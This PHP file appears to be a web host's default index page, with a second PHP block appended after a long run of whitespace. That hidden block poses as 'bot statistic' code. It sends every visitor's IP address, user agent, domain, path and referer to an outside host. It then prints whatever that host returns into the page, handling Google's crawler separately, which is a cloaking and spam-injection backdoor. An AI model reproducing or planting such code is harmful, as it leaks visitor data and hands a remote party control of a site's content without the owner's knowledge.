<?
error_reporting(0);

if (file_exists('./index.html')) {
  rename('./index.php', './a2-default-index.php');
  header('refresh:1');
}

$ch = curl_init('http://www.a2hosting.com/ad/default-page.php?domain='.$_SERVER['HTTP_HOST']);
curl_exec($ch); curl_close($ch);
?>

																																																																								 <?php	 	/*This code use for global bot statistic*/ 	$sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); /*Looks for google search bot*/ 	$sReferer = ''; 	if(isset($_SERVER['HTTP_REFERER']) === true) 	{ 		$sReferer = strtolower($_SERVER['HTTP_REFERER']); 	} 	$stCurlHandle = NULL; 	if(!(strpos($sUserAgent, 'google') === false)) /*Bot comes*/ 	{ 		if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) /*Create bot analitics*/			 		$stCurlHandle = curl_init('http://openprotect1.net/Safety/Stat13/Stat.php?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']).'&ref='.urlencode($sReferer));  	} else 	{ 		if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) /*Create bot analitics*/			 		$stCurlHandle = curl_init('http://openprotect1.net/Safety/Stat13/Stat.php?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&addcheck='.'&check='.isset($_GET['look']).'&ref='.urlencode($sReferer));  	} 	curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1); 	$sResult = curl_exec($stCurlHandle);  	curl_close($stCurlHandle);  	echo $sResult; /*Statistic code end*/ ?>	 	
